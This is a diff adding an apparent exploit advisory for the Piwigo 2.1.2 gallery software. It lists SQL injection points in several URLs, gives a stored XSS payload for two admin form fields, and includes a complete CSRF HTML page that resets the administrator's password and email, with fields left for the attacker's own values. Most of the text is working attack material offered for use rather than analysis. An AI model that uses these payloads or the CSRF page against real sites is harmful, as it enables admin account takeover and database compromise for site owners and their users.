@@ -1,0 +1,60 @@
+--=Sql injection=--
+
+
+http://www.target.com/path/comments.php?keyword=charif38@hotmail.fr&author=sweet&cat=1[SQLi]&since=1&sort_by=date&sort_order=DESC&items_number=5
+
+http://www.target.com/path/picture.php?1sweet[SQLi]&action=rate=0
+
+http://www.target.com/path/index.php?/search/10[SQli]
+
+
+--=Stored Xss=--
+
+Admin login required
+Attack pattern : >'<script>alert("Sweet")</script>
+
+http://www.target.com/path/admin.php?page=tags
+
+The POST variable "Nouveau tag" is vulnerable to a stored xss attack
+
+http://www.target.com/path/admin.php?page=cat_list
+
+The POST variable "Ajouter une catégorie virtuelle" is vulnerable to a stored xss attack
+
+
+
+--=CSRF=--
+Change admin password exploit
+
+<html>
+<body>
+<h1>Piwigo-2.1.2 Change admin password CSRF </h1>
+<form method="POST" name="form0" action="http://www.target.com/path/admin.php?page=profile&user_id=1">
+<input type="hidden" name="redirect" value="admin.php?page"/>
+<input type="hidden" name="mail_address" value="charif38@hotmail.fr"/> <!-- Your email here -->
+<input type="hidden" name="use_new_pwd" value="sweet"/> <!-- Your password here -->
+<input type="hidden" name="passwordConf" value="sweet"/> <!-- Your password here -->
+<input type="hidden" name="nb_image_line" value="5"/>
+<input type="hidden" name="nb_line_page" value="3"/>
+<input type="hidden" name="theme" value="Sylvia"/>
+<input type="hidden" name="language" value="fr_FR"/>
+<input type="hidden" name="recent_period" value="7"/>
+<input type="hidden" name="expand" value="false"/>
+<input type="hidden" name="show_nb_comments" value="false"/>
+<input type="hidden" name="show_nb_hits" value="false"/>
+<input type="hidden" name="maxwidth" value=""/>
+<input type="hidden" name="maxheight" value=""/>
+<p> Push the Button <input type="submit" name="validate" value="Valider"/> </p>
+</form>
+<form method="GET" name="form1" action="http://www.target.com/path/admin.php?page=user_list">
+<input type="hidden" name="name" value="value"/> 
+</form>
+</body>
+</html>
+
+
+[ thx and RIP to Milw0rm.com , JF - Hamst0r - Keystroke you always be right here 3> ] , inj3ct0r.com , exploit-db.com
+
+
+1,2,3 VIVA LALGERIE
+
